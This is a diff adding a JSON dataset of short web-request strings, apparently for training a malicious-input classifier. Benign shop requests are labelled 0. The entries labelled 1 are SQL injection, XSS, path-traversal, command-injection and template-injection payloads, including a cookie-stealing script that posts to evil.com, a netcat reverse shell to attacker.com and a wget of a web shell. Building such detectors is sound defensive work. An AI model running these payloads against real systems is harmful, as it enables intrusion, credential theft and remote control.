@@ -1,0 +1,398 @@
+[
+  {
+    "text": "hello user login",
+    "label": 0
+  },
+  {
+    "text": "normal request data",
+    "label": 0
+  },
+  {
+    "text": "search shoes online",
+    "label": 0
+  },
+  {
+    "text": "open my account",
+    "label": 0
+  },
+  {
+    "text": "user login page",
+    "label": 0
+  },
+  {
+    "text": "check account balance",
+    "label": 0
+  },
+  {
+    "text": "view profile",
+    "label": 0
+  },
+  {
+    "text": "update profile information",
+    "label": 0
+  },
+  {
+    "text": "search products",
+    "label": 0
+  },
+  {
+    "text": "find shoes",
+    "label": 0
+  },
+  {
+    "text": "show available products",
+    "label": 0
+  },
+  {
+    "text": "get product details",
+    "label": 0
+  },
+  {
+    "text": "view order history",
+    "label": 0
+  },
+  {
+    "text": "track my order",
+    "label": 0
+  },
+  {
+    "text": "contact support",
+    "label": 0
+  },
+  {
+    "text": "customer support page",
+    "label": 0
+  },
+  {
+    "text": "reset my password",
+    "label": 0
+  },
+  {
+    "text": "change account password",
+    "label": 0
+  },
+  {
+    "text": "view notifications",
+    "label": 0
+  },
+  {
+    "text": "open dashboard",
+    "label": 0
+  },
+  {
+    "text": "show recent orders",
+    "label": 0
+  },
+  {
+    "text": "search laptop online",
+    "label": 0
+  },
+  {
+    "text": "search mobile phones",
+    "label": 0
+  },
+  {
+    "text": "buy running shoes",
+    "label": 0
+  },
+  {
+    "text": "show products under 100 dollars",
+    "label": 0
+  },
+  {
+    "text": "view shopping cart",
+    "label": 0
+  },
+  {
+    "text": "checkout my cart",
+    "label": 0
+  },
+  {
+    "text": "apply discount code",
+    "label": 0
+  },
+  {
+    "text": "view store information",
+    "label": 0
+  },
+  {
+    "text": "get shipping information",
+    "label": 0
+  },
+  {
+    "text": "admin' OR 1=1 --",
+    "label": 1
+  },
+  {
+    "text": "admin' OR '1'='1",
+    "label": 1
+  },
+  {
+    "text": "' OR 1=1#",
+    "label": 1
+  },
+  {
+    "text": "' OR 'x'='x",
+    "label": 1
+  },
+  {
+    "text": "UNION SELECT password FROM users",
+    "label": 1
+  },
+  {
+    "text": "UNION SELECT username,password FROM users",
+    "label": 1
+  },
+  {
+    "text": "SELECT * FROM users",
+    "label": 1
+  },
+  {
+    "text": "SELECT password FROM accounts",
+    "label": 1
+  },
+  {
+    "text": "DROP TABLE users",
+    "label": 1
+  },
+  {
+    "text": "DELETE FROM users WHERE id=1",
+    "label": 1
+  },
+  {
+    "text": "INSERT INTO users VALUES",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(1)</script>",
+    "label": 1
+  },
+  {
+    "text": "<script>alert(document.cookie)</script>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=alert(1)>",
+    "label": 1
+  },
+  {
+    "text": "<img src=x onerror=confirm(1)>",
+    "label": 1
+  },
+  {
+    "text": "<iframe src=javascript:alert(1)>",
+    "label": 1
+  },
+  {
+    "text": "javascript:alert(document.cookie)",
+    "label": 1
+  },
+  {
+    "text": "<svg onload=alert(1)>",
+    "label": 1
+  },
+  {
+    "text": "document.cookie",
+    "label": 1
+  },
+  {
+    "text": "eval(alert(1))",
+    "label": 1
+  },
+  {
+    "text": "../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "../../../etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "..\\..\\windows\\system32",
+    "label": 1
+  },
+  {
+    "text": "/etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "cmd=whoami",
+    "label": 1
+  },
+  {
+    "text": "whoami",
+    "label": 1
+  },
+  {
+    "text": "wget http://example.test/file",
+    "label": 1
+  },
+  {
+    "text": "curl http://example.test/file",
+    "label": 1
+  },
+  {
+    "text": "rm -rf /tmp/test",
+    "label": 1
+  },
+  {
+    "text": "xp_cmdshell",
+    "label": 1
+  },
+  {
+    "text": "base64,ZXZpbA==",
+    "label": 1
+  },
+  {
+    "text": "view dashboard summary",
+    "label": 0
+  },
+  {
+    "text": "get order history",
+    "label": 0
+  },
+  {
+    "text": "update shipping address",
+    "label": 0
+  },
+  {
+    "text": "list recent transactions",
+    "label": 0
+  },
+  {
+    "text": "change password successfully",
+    "label": 0
+  },
+  {
+    "text": "logout current session",
+    "label": 0
+  },
+  {
+    "text": "fetch product catalog",
+    "label": 0
+  },
+  {
+    "text": "apply discount coupon",
+    "label": 0
+  },
+  {
+    "text": "add item to cart",
+    "label": 0
+  },
+  {
+    "text": "checkout order",
+    "label": 0
+  },
+  {
+    "text": "view invoice pdf",
+    "label": 0
+  },
+  {
+    "text": "contact support team",
+    "label": 0
+  },
+  {
+    "text": "subscribe newsletter",
+    "label": 0
+  },
+  {
+    "text": "rate this product",
+    "label": 0
+  },
+  {
+    "text": "leave a review comment",
+    "label": 0
+  },
+  {
+    "text": "track my package",
+    "label": 0
+  },
+  {
+    "text": "filter products by price",
+    "label": 0
+  },
+  {
+    "text": "sort results by rating",
+    "label": 0
+  },
+  {
+    "text": "open settings page",
+    "label": 0
+  },
+  {
+    "text": "enable two factor authentication",
+    "label": 0
+  },
+  {
+    "text": "' UNION SELECT username,password FROM users--",
+    "label": 1
+  },
+  {
+    "text": "../../../../windows/system32/config/sam",
+    "label": 1
+  },
+  {
+    "text": "; DROP TABLE orders;--",
+    "label": 1
+  },
+  {
+    "text": "<svg/onload=alert(document.cookie)>",
+    "label": 1
+  },
+  {
+    "text": "admin'/**/OR/**/1=1#",
+    "label": 1
+  },
+  {
+    "text": "eval(base64_decode([cmd]))",
+    "label": 1
+  },
+  {
+    "text": "../../../etc/shadow",
+    "label": 1
+  },
+  {
+    "text": "1' AND SLEEP(5)--",
+    "label": 1
+  },
+  {
+    "text": "cmd=cat /etc/passwd",
+    "label": 1
+  },
+  {
+    "text": "<script>fetch(\"http://evil.com?c=\"+document.cookie)</script>",
+    "label": 1
+  },
+  {
+    "text": "' OR 'a'='a",
+    "label": 1
+  },
+  {
+    "text": "exec xp_cmdshell(\"whoami\")",
+    "label": 1
+  },
+  {
+    "text": "{{7*7}}",
+    "label": 1
+  },
+  {
+    "text": "../../../boot.ini",
+    "label": 1
+  },
+  {
+    "text": "nc -e /bin/sh attacker.com 4444",
+    "label": 1
+  },
+  {
+    "text": "wget http://malicious.site/shell.php",
+    "label": 1
+  },
+  {
+    "text": "user'--",
+    "label": 1
+  },
+  {
+    "text": "select load_file(0x2f6574632f706173737764)",
+    "label": 1
+  }
+]
